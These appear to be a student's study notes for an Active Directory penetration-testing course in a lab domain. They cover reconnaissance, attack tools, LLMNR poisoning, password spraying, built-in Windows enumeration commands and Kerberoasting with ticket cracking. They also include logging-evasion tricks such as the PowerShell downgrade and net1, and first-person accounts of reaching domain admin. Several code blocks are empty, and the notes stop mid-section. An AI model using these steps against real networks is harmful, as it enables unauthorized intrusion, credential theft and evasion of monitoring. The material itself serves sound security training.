Active directory is a directory service for Windows enterprise environments that was officially implemented in 2000.Active Directory is based on protocols x.500 and LDAP(Lightweight Directory Access Protocol.) It is a distributed, hierarchical structure that allows centralized management of an organization's resources, including users, computers, groups, network devices and file , group policies, devices, and trusts. AD provides authentication, authorization and accounting.

Active Directory is important because Microsoft Active Directory holds around 43% of the market share for enterprise organizations utilizing Identity and Access management solutions,
There have also been a huge number of vulnerabilities discovered regarding AD in the past years so the threat is present. We practice enumerating AD with different tools such as Sysinternals, WMI,  DNS, and others. Some attacks will include the usage of tools like Responder, Kerbrute, Bloodhound and more.

General hold is getting foothold in and Active Directory environment and moving laterally or vertically and escalating privileges until we accomplish intended goal or reach certain position.

Here we can use our tools but we also need to be comfortable enumerating and attacking AD with limited set of tools or built in Windows tools known as "living of the land".

**Real-World examples (important- learn from this)**

First example:

***During this engagement, I compromised a single host and gained `SYSTEM` level access. Because this was a domain-joined host, I was able to use this access to enumerate the domain. I went through all of the standard enumeration, but did not find much. There were `Service Principal Names` (SPNs) present within the environment, and I was able to perform a Kerberoasting attack and retrieve TGS tickets for a few accounts. I attempted to crack these with Hashcat and some of my standard wordlists and rules, but was unsuccessful at first. I ended up leaving a cracking job running overnight with a very large wordlist combined with the [d3ad0ne](https://github.com/hashcat/hashcat/blob/master/rules/d3ad0ne.rule) rule that ships with Hashcat. The next morning I had a hit on one ticket and retrieved the cleartext password for a user account. This account did not give me significant access, but it did give me write access on certain file shares. I used this access to drop SCF files around the shares and left Responder going. After a while, I got a single hit, the `NetNTLMv2 hash` of a user. I checked through the BloodHound output and noticed that this user was actually a domain admin! Easy day from here.***


Second example:

***Password spraying can be an extremely effective way to gain a foothold in a domain, but we must exercise great care not to lock out user accounts in the process. On one engagement, I found an SMB NULL session using the [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) tool and retrieved both a listing of `all` users from the domain, and the domain `password policy`. Knowing the password policy was crucial because I could ensure that I was staying within the parameters to not lock out any accounts and also knew that the policy was a minimum eight-character password and password complexity was enforced (meaning that a user's password required 3/4 of special character, number, uppercase, or lower case number, i.e., Welcome1). I tried several common weak passwords such as Welcome1, `Password1`, Password123, `Spring2018`, etc. but did not get any hits. Finally, I made an attempt with `Spring@18` and got a hit! Using this account, I ran BloodHound and found several hosts where this user had local admin access. I noticed that a domain admin account had an active session on one of these hosts. I was able to use the Rubeus tool and extract the Kerberos TGT ticket for this domain user. From there, I was able to perform a `pass-the-ticket` attack and authenticate as this domain admin user. As a bonus, I was able to take over the trusting domain as well because the Domain Administrators group for the domain that I took over was a part of the Administrators group in the trusting domain via nested group membership, meaning I could use the same set of credentials to authenticate to the other domain with full administrative level access.***

Third example:

***I had tried all of my standard ways to obtain a foothold on this third engagement, and nothing had worked. I decided that I would use the [Kerbrute](https://github.com/ropnop/kerbrute) tool to attempt to enumerate valid usernames and then, if I found any, attempt a targeted password spraying attack since I did not know the password policy and didn't want to lock any accounts out. I used the [linkedin2username](https://github.com/initstring/linkedin2username) tool to first mashup potential usernames from the company's LinkedIn page. I combined this list with several username lists from the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo and, after using the `userenum` feature of Kerbrute, ended up with 516 valid users. I knew I had to tread carefully with password spraying, so I tried with the password `Welcome2021` and got a single hit! Using this account, I ran the Python version of BloodHound from my attack host and found that all domain users had RDP access to a single box. I logged into this host and used the PowerShell tool [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) to spray again. I was more confident this time around because I could a) view the password policy and b) the DomainPasswordSpray tool will remove accounts close to lockout from the target list. Being that I was authenticated within the domain, I could now spray with all domain users, which gave me significantly more targets. I tried again with the common password Fall2021 and got several hits, all for users not in my initial wordlist. I checked the rights for each of these accounts and found that one was in the Help Desk group, which had [GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all) rights over the [Enterprise Key Admins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#enterprise-key-admins) group. The Enterprise Key Admins group had GenericAll privileges over a domain controller, so I added the account I controlled to this group, authenticated again, and inherited these privileges. Using these rights, I performed the [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) attack and retrieved the NT hash for the domain controller machine account. With this NT hash, I was then able to perform a DCSync attack and retrieve the NTLM password hashes for all users in the domain because a domain controller can perform replication, which is required for DCSync.***



**Tools that will be used (important to add to the tool section in mintfly)**

***PowerView/SharpView*** - A Powershell tool and a .NET port at the same time that is used to gain situational awareness in the AD environment. PowerView and SharpView can help us gather much of the data that BloodHound does but it requires more work to make meaningful relationships among all of the data points. These tools are a great way to see what additional access we may have with a new set of credentials, targeting specific users and computers, or finding "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting.

***Bloodhound*** - This tool is uset to visually map out AD environment and relationships and help to plan attack paths that may otherwise go unnoticed. It uses the SharpHound PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with the Neo4j database for graphical analysis of the AD environment.

***SharpHound*** - This is the C# tool that is used for data collection to gather information from Active Directory about varying AD objects such as users, computers, groups, ACLs, GPOs, user and computer attributes, user sessions, and much more. It produces JSON files that are then ingested into the BloodHound GUI  tool for further analysis.

***BloodHound.py*** - This is a python based BloodHound ingestor based on the Impacet toolkit. It supports most BloodHound collection methods and can be run from the non-domain joined attack host. Later on, gathered data, can be ingested into BloodHound GUI for further analysis.

***Kerbrute*** - This is a tool written in Go that uses Kerberos pre-authentication to enumerate AD users, perform password-spraying and brute-forcing.

***Impacket-toolkit*** - This is a collection of tools that is written in Python for interacting with network protocols and it contains a lot of scripts that can be used for enumeration and attacking of AD.

***Responder*** - Responder is a purpose-build tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.

***Inveigh.ps1*** - This is a tool that is similar to Responder. It is a PowerShell tool used for performing various network spoofing an poisoning attacks.

***C# Inveigh*** - The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes.

***rpcinfo*** - The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The "-p" option is used to specify the target host. For example the command "rpcinfo -p 10.0.0.1" will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges.

***rpcclient*** - A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.

***CrackMapExec(CME)*** - CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL.

***Rubeus*** - This is a C# tool built for Kerberos abuse.

***GetUserSPNs.py*** - Another Impacket module geared towards finding Service Principal names tied to normal users.

***Hashcat*** - tool for cracking and password recovery.

***enum4linux*** - a tool for enumerating information from Windows and Samba systems.

***enum4linux-ng*** - a rework of the enum4linux tool that works a bit defferently.

***ldapsearch*** - built-in interface for interacting with LDAP protocol.

***windapserach*** - a python script that is used for enumeration AD users, groups and computers using LDAP queries. Useful for automating custom LDAP queries.

***DomainPasswordSpray.ps1*** - DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of the domain.

***LAPSToolkit*** - The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).

***smbmap*** -smb share enumeration across a domain.

***psexec.py*** - Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell.

***wmiexec.py*** - Part of the Impacket toolkit, it provides the capability of command execution over WMI.

***snaffler*** - useful tool for finding information (such as credentials) in Active Directory anon computers with accessible file shares.

***smbserver.py*** - Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.

***setspn.exe*** - Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.

***Mimikatz*** - Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host.

***secretsdump.py*** - Remotely dump SAM and LSA secrets from a host.

***evil-winrm*** - Provides us with an interactive shell on a host over the WinRM protocol.

***mssqlclient.py*** - Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases.

***noPac.py*** - Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.

***rpcdump.py*** - Part of the Impacket toolset, RPC endpoint mapper.

***ntlmrelayx.py*** - Part of the Impacket toolset, it performs SMB relay attacks.

***PetitPotam.py*** - PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.

***gettgtpkinit.py*** - Tool for manipulating certificates and TGTs.

***getnthash.py*** - This tool will use an existing TGT to request a PAC for the current user using U2U.

***adidnsdump*** - A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer.

***gpp-decrypt*** - Extracts usernames and passwords from Group Policy preferences files.

***GetNPUsers.py*** - Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking.

***lookupsid.py*** - SID bruteforcing tool.

***ticketer.py*** - A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc.

***raiseChild.py*** - Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation.

***Active Directory Explorer*** - Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.

***PingCastle*** - Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on [CMMI](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) adapted to AD security).

***Group3r*** - Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).

***ADRecon*** - A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.





**External Recon**

***Why***

We can think of this as the lay of the land to insure that we provide the most comperhensive test possible for our customer. We identify leaks of any important documentation or credentials. This can be as simple as gleaning a username format from the customers main website or social media.

***What*** we should be looking for is:

ID Space - Valid ASN, netblocks, cloud presence, DNS records, etc.

Domain Information - Based on IP data, DNS, and site registrations. Who administers the domain= Any subdomains? Publicly accessible domain services? (Mailservers, DNS, Websites, VPN Portals, etc.), Can we confirm what kind of defenses are in place? (SIEM, AV, IPS/IDS in use, etc.)

Schema Format - Can we discover organization's email account, AD usernames, and even password policies? Anything that will give us information we can use to build a valid username list to test external-facing services for password spraying, credential stuffing, brute forcing, etc.

Data disclosures - Any publicly accesible files like .pdf, .ppt, etc. Metadata or shares and other critical software and hardware in environmaent are also important.

Breach Data - Any publicly released usernames, passwords, or other critical information that can help an attacker gain a foothold.


***Where***

ASN/IP registrars - IANA,arin for searching the Americas, RIPE for searching in Europe, BGP Toolkit

Domain Registrars & DNS - Domaintools, PTRArchive, ICANN, manual DNS record requests against the domain in question or against well known DNS servers, such as 8.8.8.8

Social media - Searching Linkedin, Instagram, Facebook, Twitter and other major social media sites, news articles, and any relevant info we can find about the organization

Public-Facing Company Websites - Often, the public website for corporation will have relevant info embedded. News articles, embedded documents, and the "About us" section of the page or pages themselves.

Cloud & Dev Storage Spaces - GitHub, AWS S3 Buckets & Azure Blog storage containers, Google searches using "Dorks"

Breach Data sources - HaveIBeenPwned to determine if any corporate email accounts appear in public breach data, Dehashed to search for corporate emails with cleartext passwords or hashes we can try to crack offline. We can then try these passwords agains any exposed login portals that may use AD authentication.



BGP-Toolkit - Good for searching what address blocks are assigned to an organization and what ASN they reside within.

For DNS lookup interesting sites like domaintools and viewDNS.info are great spots. we may sometimes find additional hosts outside the scope that look interestiong. We should look that up with our client. We may also find interestiong subdomains that were not listed in scoping document, but reside on in-scope IP addresses and therefore are fair game.


in bgp-toolkit we can se some information for inlanefreight.com about the IP address, Mail Exchanger and also TXT records. in viewDNS.info we can also see a lot of stuff including subdomains. If we search filetype:pdf inurl:inlanefreight.com, we can see pdf files related to inlanefreight.com site. there we found pdf file. we can also search for mail addresses like this:
intext:"@inlanefreight.com" inurl:inlanefreight.com. there we found contact page with a list of emails for users. we can think of them still active. now we have naming convection for emails. we can later use this on for brute forcing or password spraying.

We can use a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to scrape data from a company's LinkedIn page and create various mashups of usernames (flast, first.last, f.last, etc.) that can be added to our list of potential password spraying targets.

#### Credential Hunting

[Dehashed](http://dehashed.com/) is an excellent tool for hunting for cleartext credentials and password hashes in breach data. We can search either on the site or using a script that performs queries via the API. Typically we will find many old passwords for users that do not work on externally-facing portals that use AD auth (or internal), but we may get lucky! This is another tool that can be useful for creating a user list for external or internal password spraying.


For our initial enumeration on this module, we are it seems doing internal enumeration. This can be done a lot of ways but for us to actually enumerate internally (as agreed in the scope of the testing that our client specified) we need to have access to inside of the network.

This can be done multiple ways:

1. A penetration testing distro (typically Linux) as a virtual machine in their infrastructure that calls back to a jump host we control over the VPN, and we can SSH into.
2. A physical device plugged into an ethernet port that calls back to us over VPN
3. A physical presence in their office with our laptop plugged into their ethernet port
4. A Linux VM in either Azure or AWS with access to the internal network what we can SSH into using public key authentication and our publiv IP address whitelisted.
5. VPN accesss into their internal network
6. From a corporate laptop connected to the clients VPN
7. On a managed workstation physically sitting in their office with limited or no internet access or ability to pull in tools. They might also  allow internet usage and to pull in tools.
8. On a VDI (virtual desktop) accessed using Citrix or the like, with one of the configurations described for the manged workstation typically accesible over VPN either remotely or from a corporate laptop.

**Key Data Points!!!**

1. AD Users - We are trying to enumerate valid user accounts we can target for password spraying
2.  AD Joined Computers - Key computers that we target include Domain Controllers, file servers, SQL servers, Mail Exchange servers, database servers, etc.
3. Key services - Kerberos, NetBIOS, LDAP, DNS,...
4. Vulnerable Hosts and Services - Anything that can be a quick win (a.k.a an easy host to exploit and gain a foothold)

Enumerating AD is hard without planning. Methodology important!!! 

No matter how we proceed we typically start at the same place and look for the same data points. 

Passive indentification and active validation of the results. Afterwards we probe. Afterwards we stop, group and anaylize what we got. Hopefully credentials or user account.

**Tools and techniques**

We can use Wireshark or TCPDump to inspect network and intercept packets and analyse them. this is especially helpful in black box approach.

It is usefull to save what we scan with wireshark and tcpdump (PCAP traffic). if we cannot transfer tools for example to windows, we already have installed network monitoring tool known as pktmon.exe which is installed to all editions of windows 10.

It should be noted that I connected to their linux VM with xfreerdp and there used wireshark and other tools.

We use **Responder** to analyse network traffic.

It is a tool built to listen, analyze, and poison LLMNR, NBT-NS, and MDNS requests and responses.

Here we can find some hosts that we did not find with wireshark and it is worth it to note them down.

active checks we can perform with **fping**.

it provides similar capability as the standard ping application in that it utilizes ICMP requests and replies to reach out and interact with the host. it shines in its ability to send requests to mulitple hosts at once. it runs in cyclical manner instead of waiting. this is not one-stop-shop but it will tell as an inital idea of what exists.

fping flags:
1. a - to show targets that are alive
2. s - to print stats at the end of the scan
3. g - to generate a target list from the CIDR network
4. q - to not show per-target results

example:

```bash
fping -asqg 172.16.5.0/23
```

Next we can proceed to **nmap scanning** for more detailed scan of the alive targets for active services and their ports. We want to identify critical hosts such as Domain Controllers and web servers, and identify potentially vulnerable hosts to probe later.

In AD it would be nice to focus on accompanying AD services such as ***DNS,SMB,LDAP, and Kerberos***

example of the scan:

```bash
sudo nmap -sS -v -A 172.16.5.5 172.16.5.130 -oN /home/htb-student/Documents/hosts-enum
```

this uses stealth, v prints steps, -A stands for aggresive and -oN outputs normal text to read by human.

it is good practice here to look for older software that some large enterprise environments still use so we can exploit them easily.

we need to be aware how our tools work. nmap could cause instability in the system or take it offline which can cause issues. we need to understand the scans we take. 

**Identifying Users**

The access, even the lower one, offers a lot of opportunities.

**LLMNR/NBT-NS Poisoning - from Linux**


We will work through two different techniques side by side: network poisoning and password spraying. We want to acquire cleartext credentials for domain account thereby gaining us a foothold in the domain.

We will perform man-in-the-middle attack on Linked-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) broadcasts. Depending on the network, we may get low-privileged or administrative level password hashes that can also sometimes be used to perform SMB relay attacks.

***LLMNR & NBT-NS Primer***

They are used if DNS fails for host identification. If DNS fails for some reason then LLMNR is used and it asks all machines on the local network for the correct host address. LLMNR is based upon the Domain Name System (DNS) and allows the hosts on the same local link to perform name resolution for other hosts. It uses port 5355 over UDP. If LLMNR fails then NBT-NS will be used. It identifies systems on a local network by their NetBIOS name. It utilizes port 137 over UDP.

The thing is, when LLMNR and NBT-NS are used for name resolution, ANY host on the  network can reply. This is where we come in with the Responder and poison these requests. We can poison the authoritative name resolution source in the broadcast domain by responding to LLMNR nad NBT-NS traffic as if they have the answer for the requesting host. This poisoning effort is done to get the victims to communicate with our system by pretending we know about the requested host. If the requested host requires authentication then we capture NetNTLM hash and crack it offline or use it for pass the hash attacks. We can then use it against different protocols such as LDAP.

Example for LLMNR/NBT-NS poisoning.

1. Let's say the host is attempting to connect to \\print1.inlanefreight.local but accidentally types in \\printer1@inlanefreight.local 
2. DNS server responds with not knowing this host
3. Then host broadcasts request to the entire network asking if anyone knows this host and its location (\\printer1@inlanefreight.local)
4. We (the attacker with Responder) respond to the host stating that we are the \\printer1@inlanefreight.local
5. The host believes us and sends username and NTLMv2 password hash to authenticate
6. We then crack the NTMLv2 hash online and use it elsewhere.

how to check if target is vulnerable to LLMNR and NBT-NS:
Based on the module content, here are a few ways to check for this vulnerability:

### 1. Active Poisoning (The Attacker's Method)

The most direct way to test for vulnerability is to attempt the attack itself in a controlled manner. As demonstrated in this section and the previous one, you can use a tool to listen for LLMNR and NBT-NS queries.

- **On Windows:** Use a tool like **Inveigh**, as covered in the "LLMNR/NBT-NS Poisoning - from Windows" section. If you run `Inveigh.exe` or `Invoke-Inveigh` and immediately start seeing name resolution requests and capturing hashes, the network is vulnerable.
- **On Linux:** Use a tool like **Responder**. If you run it and it captures authentication hashes, you've confirmed the vulnerability.

If these tools successfully capture hashes, it proves that:

- Hosts on the network are using LLMNR/NBT-NS for name resolution.
- These protocols are not disabled.
- You can successfully poison responses and trick clients into authenticating to you.

### 2. Passive Network Monitoring

You can passively listen to network traffic to see if the protocols are in use.

- Use a network analyzer like **Wireshark** or **tcpdump**.
- Filter for traffic on the ports used by these protocols:
    - **LLMNR:** `UDP port 5355`
    - **NBT-NS:** `UDP port 137`

If you see broadcast or multicast traffic on these ports from various hosts, it means the protocols are active on the network and likely vulnerable to poisoning.

### 3. Host-Level Configuration Check

You can check the configuration of an individual Windows host to see if it has these protocols enabled. The "Remediation" part of this section gives us the clues.

- **To check for LLMNR:**
    
    - Open the Local Group Policy Editor (`gpedit.msc`).
    - Navigate to `Computer Configuration -> Administrative Templates -> Network -> DNS Client`.
    - Check the status of "**Turn off multicast name resolution**". If it is "Not Configured" or "Disabled", then LLMNR is enabled and the host is vulnerable.
- **To check for NBT-NS:**
    
    - Open your network adapter's properties.
    - Go to `Internet Protocol Version 4 (TCP/IPv4) -> Properties -> Advanced -> WINS` tab.
    - Look at the "NetBIOS setting". If "**Disable NetBIOS over TCP/IP**" is not selected, then NBT-NS is enabled.

In summary, the easiest and most definitive way for a penetration tester to check for vulnerability is to run a tool like **Inveigh** or **Responder**. If you capture hashes, the network is vulnerable.

### Enumerating and retrieving password policies

### Summary: Enumerating & Retrieving Password Policies

This section details various methods for discovering an Active Directory domain's password policy, which is a critical step for planning attacks like password spraying. The techniques are divided based on whether you have credentials and the operating system you are attacking from.

#### Key Enumeration Methods

1. **Credentialed Enumeration (from Linux):**  
    If you have valid domain credentials, you can directly query the password policy. The section demonstrates using `CrackMapExec` (NetExec now) with the `--pass-pol` flag to retrieve detailed policy information, including minimum password length, password history, lockout threshold, and complexity requirements.
    
2. **Uncredentialed Enumeration (from Linux):**  
    Without credentials, enumeration relies on finding common misconfigurations:
    
    - **SMB NULL Sessions:** This legacy misconfiguration allows an unauthenticated user to connect to the IPC$ share and query domain information. Tools like `rpcclient`, `enum4linux`, and its modern successor `enum4linux-ng` can exploit this to dump the password policy.
    - **LDAP Anonymous Binds:** Another legacy setting where unauthenticated users can perform LDAP queries. The `ldapsearch` tool can be used to query domain objects and filter for password policy attributes like `pwdHistoryLength` and `minPwdLength`.
3. **Enumeration from Windows:**
    
    - **With Credentials:** On a domain-joined machine, the built-in `net accounts` command provides a clean, readable summary of the password policy. For more detailed, object-oriented output, PowerShell tools like PowerView (`Get-DomainPolicy`) are extremely effective.
    - **Without Credentials:** You can test for a NULL session from Windows using the `net use \\<HOST>\ipc$ "" /u:""` command. The section also shows common error codes you might receive when authentication fails, which can help diagnose if an account is disabled, locked out, or if the password is simply incorrect.

#### Analyzing the Policy for Attacks

Once the policy is retrieved, you must analyze it from an attacker's perspective. The section uses the `INLANEFREIGHT.LOCAL` domain as an example to highlight key attributes:

- **Minimum Password Length (8):** A low minimum length increases the chances of weak, guessable passwords.
- **Account Lockout Threshold (5):** This tells you how many bad password attempts you can make before an account is locked. A threshold of 5 allows for 2-3 "safe" guesses during a password spray.
- **Lockout Duration (30 minutes):** This indicates how long a locked account will remain inaccessible. Knowing this helps time subsequent spray attempts to avoid causing a denial-of-service condition.
- **Password Complexity (Enabled):** While it sounds secure, this often just means users add a capital letter, a number, and a special character to a common word (e.g., `Summer2024!`), which is still highly susceptible to password spraying.

The primary takeaway is that a "weak" policy (low length, high lockout threshold) makes password spraying a highly effective and relatively low-risk attack vector. The section concludes with a critical warning: **never lock out user accounts**. If the policy is unknown, be extremely cautious and limit password guesses to one or two attempts over a long period.

**Key Concepts:**

- **Password Spraying:** An attack method where a single password (or a small list of common passwords) is tried against many different user accounts. This is done to avoid triggering account lockout policies that typically activate after multiple failed logins for a single user.
- **Local Administrator Password Reuse:** A common misconfiguration where the same password for a local administrator account is used across multiple workstations and servers. This allows an attacker who compromises one machine's local admin account to potentially gain administrative access to many others.

**Practical Application:**

- **Tools for Domain Spraying:** The section demonstrates three tools for password spraying against domain accounts from a Linux host:
    - `rpcclient`: Uses a Bash `for` loop to iterate through a user list, identifying successful logins by filtering for the `Authority Name` in the output.
    - `kerbrute`: Uses the `passwordspray` command to efficiently test credentials against Kerberos.
    - `crackmapexec`: A versatile tool that can test a list of users against a single password over SMB, with successful logins marked by a `[+]`.
- **Local Admin Spraying:** `crackmapexec` can be used to spray a compromised local administrator's NTLM hash across an entire subnet. The `--local-auth` flag is critical to prevent domain account lockouts by ensuring it only attempts a local login on each machine.

**Watch Out For:**

- **Account Lockouts:** Standard password spraying against domain accounts can still cause lockouts if not done carefully. The goal is "low and slow."
- **Noise:** Spraying an entire subnet with `crackmapexec` is a very "noisy" technique that will be easily detected by most security monitoring solutions. It is not suitable for stealthy operations.
- **Remediation:** The use of Microsoft's **LAPS (Local Administrator Password Solution)** is mentioned as an effective defense against local administrator password reuse.

## Credentialed Enumeration - From Windows

**Key Concepts:**

- **Situational Awareness:** The primary objective is to understand the domain's structure, including trusts, users, groups, computers, and permissions.
- **Built-in vs. Third-Party Tools:** The section introduces both native Windows tools (like the ActiveDirectory PowerShell module) and popular third-party tools (like PowerView, Snaffler, and BloodHound/SharpHound). Using built-in tools can be stealthier.

**Practical Application:**  
The techniques in this section are used to turn a low-privilege domain user account into a comprehensive map of the domain's weaknesses. An attacker would use these tools to find the quickest path to Domain Admin, identify sensitive data on file shares, or discover trust relationships that can be abused to move into other domains.

**Watch Out For:**

- **Data Overload:** Tools like Snaffler and BloodHound can generate a massive amount of data. It's crucial to output results to a file and have a systematic way to analyze them.
- **Tool Footprint:** Dropping tools onto a target system leaves a forensic footprint. You must document all files transferred and be prepared to clean them up after the engagement.

"Living Off the Land" (LotL) is a technique used by penetration testers and attackers to perform enumeration and other actions using only the native, built-in tools available on the target system. This approach is stealthier than uploading custom tools, as it generates fewer alerts and blends in with normal administrative activity.

#### **1. Basic Host & Network Reconnaissance**

These commands provide a quick overview of the compromised host and its place in the network.

- **Get Hostname:**
    
    ```powershell
    hostname
    ```
    
- **Get OS Version & Patch Level:**
    
    ```powershell
    [System.Environment]::OSVersion.Version
    wmic qfe get Caption,Description,HotFixID,InstalledOn
    ```
    
- **Get Network Configuration:**
    
    ```powershell
    ipconfig /all
    ```
    
- **Get Domain Information (from CMD):**
    
    ```powershell
    echo %USERDOMAIN%
    echo %logonserver%
    ```
    
- **All-in-One Command:** The `systeminfo` command provides a comprehensive summary of the host, reducing the number of commands executed and potential log entries.
    
    ```powershell
    systeminfo
    ```
    

#### **2. Harnessing PowerShell**

PowerShell is a powerful framework for administration and, therefore, a prime tool for enumeration.

- **Check Execution Policy:** See if you can run scripts.
    
    ```powershell
    Get-ExecutionPolicy -List
    ```
    
- **Bypass Execution Policy (for current process):**
    
    ```powershell
    Set-ExecutionPolicy Bypass -Scope Process
    ```
    
- **View PowerShell History:** May contain sensitive information like passwords.
    
    ```powershell
    Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
    ```
    
- **OpSec Tactic: PowerShell Downgrade:** PowerShell versions 3.0 and newer have enhanced logging. Downgrading to version 2.0 can prevent your commands from being logged.

    ```powershell
    powershell.exe -version 2
    ```
    
    **Note:** The command to initiate the downgrade is still logged, which can alert a vigilant defender.

Understanding the host's defenses is crucial for planning next steps.

    ```powershell
    netsh advfirewall show allprofiles
    ```

    ```cmd

    ```
    
- **Get Detailed Defender Status (from PowerShell):**
    
    ```powershell
    Get-MpComputerStatus
    ```
    

#### **4. Network Enumeration**

Discover other hosts and network segments accessible from the compromised machine.

- **Check for Logged-in Users:** See if you are alone on the system.
    
    ```powershell
    qwinsta
    ```
    
- **View ARP Table:** Lists hosts the machine has recently communicated with on the local network.
    
    ```powershell
    arp -a
    ```
    
- **View Routing Table:** Identifies known networks and potential pivot points.
    
    ```powershell
    route print
    ```
    

#### **5. Windows Management Instrumentation (WMI)**

Use the `wmic` utility to query detailed system and domain information.

- **List Domain Information:**
    
    ```powershell

    ```
    
- **List User Accounts (local and cached domain):**
    
    ```powershell
    wmic useraccount list /format:list
    ```
    
- **List Local Groups:**
    
    ```powershell
    wmic group list /format:list
    ```
    

#### **6. Net Commands**

The `net` command suite is a classic tool for querying domain information. **Warning:** These commands are heavily monitored by EDR solutions.

- **Get Domain Password Policy:**
    
    ```powershell
    net accounts /domain
    ```
    
- **List Domain Groups:**
    
    ```powershell
    net group /domain
    ```
    
- **List Members of a Domain Group:**
    
    ```powershell
    net group "Domain Admins" /domain
    ```
    
- **List All Domain Users:**
    
    ```powershell
    net user /domain
    ```
    
- **Get Details for a Specific Domain User:**
    
    ```powershell

    ```
    
- **OpSec Tactic:** Using `net1` instead of `net` may execute the same function while bypassing simple string-based detection rules.
    
    ```powershell
    net1 user /domain
    ```
    

#### **7. Dsquery & LDAP Filtering**

`dsquery` is a command-line tool for finding Active Directory objects using LDAP queries.

- **Find All Users:**
    
    ```powershell
    dsquery user
    ```
    
- **Find All Computers:**
    
    ```powershell
    dsquery computer
    ```
    
- **Wildcard Search (e.g., all objects in the Users container):**
    
    ```powershell
    dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
    ```
    
- **Advanced LDAP Filtering:** Use filters to find objects with specific attributes. This example finds users who do not require a password (`PASSWD_NOTREQD`).
    
    ```powershell
    dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))"
    ```

#### OID match strings

OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:

1. `1.2.840.113556.1.4.803`

When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.

2. `1.2.840.113556.1.4.804`

When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.

3. `1.2.840.113556.1.4.1941`

This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.

# Kerberoasting - from Linux

### **Section Summary: Kerberoasting - from Linux**

#### **Key Concepts**

- **Kerberoasting:** An attack technique used for lateral movement and privilege escalation in Active Directory. It targets service accounts that have a **Service Principal Name (SPN)** configured.
- **Service Principal Name (SPN):** A unique identifier that links a service instance (like a SQL server) to a domain user account that runs it. This is often done because regular service accounts have network authentication limitations.
- **Attack Logic:** Any authenticated domain user can request a Kerberos service ticket (TGS-REP) for any service in the domain. This ticket is encrypted with the NTLM hash of the service account's password. An attacker can take this ticket offline and attempt to crack it to recover the cleartext password.

#### **Practical Application**

The attack is performed from a Linux host using Impacket's `GetUserSPNs.py` script. The main prerequisite is a set of valid domain credentials (username/password or NTLM hash).

**1. List SPNs:**  
First, you can enumerate all user accounts with an SPN to identify potential targets.

- **Command:**
    
    ```shell
    GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>
    ```
    
- **Explanation:** This command queries the Domain Controller (`-dc-ip`) using the provided credentials (`<DOMAIN>/<USER>`) and lists all accounts with associated SPNs, along with their group memberships.

**2. Request TGS Tickets:**  
Once you identify interesting accounts (e.g., members of "Domain Admins"), you can request their TGS tickets.

- **Command:**
    
    ```shell
    GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request -outputfile tickets.txt
    ```
    
- **Explanation:** The `-request` flag tells the script to request the TGS tickets for all found SPNs. The `-outputfile` flag saves the tickets into a file (`tickets.txt`) in a format that password cracking tools can use.

**3. Crack the Ticket Offline:**  
With the ticket hash saved, you can use a tool like Hashcat to crack the password.

- **Command:**
    
    ```shell
    hashcat -m 13100 tickets.txt /path/to/wordlist.txt
    ```
    
- **Explanation:** This command uses Hashcat with mode `-m 13100` (Kerberos 5, TGS-REP) to try and crack the password hashes in `tickets.txt` using a wordlist.

#### **Watch Out For**

